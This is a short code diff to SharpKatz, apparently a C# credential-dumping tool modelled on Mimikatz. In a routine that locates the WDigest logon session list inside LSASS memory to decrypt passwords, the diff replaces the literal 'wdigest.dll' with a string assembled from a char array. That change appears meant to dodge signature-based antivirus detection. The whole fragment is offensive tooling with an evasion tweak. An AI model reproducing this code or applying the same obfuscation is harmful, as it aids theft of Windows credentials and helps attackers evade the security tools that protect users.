@@ -56,7 +56,8 @@ namespace SharpKatz.Module
             IntPtr llCurrent;
             string passDecrypted = "";
 
-            logSessListAddr = Utility.GetListAdress(hLsass, wdigestMem, "wdigest.dll", max_search_size, -4, oshelper.logSessListSig);
+            string sWdigest = new string(new char[] { 'w','d','i','g','e','s','t','.','d','l','l' });
+            logSessListAddr = Utility.GetListAdress(hLsass, wdigestMem, sWdigest, max_search_size, -4, oshelper.logSessListSig);
 
             //Console.WriteLine("[*] l_LogSessList found at address {0:X}", logSessListAddr.ToInt64());
 
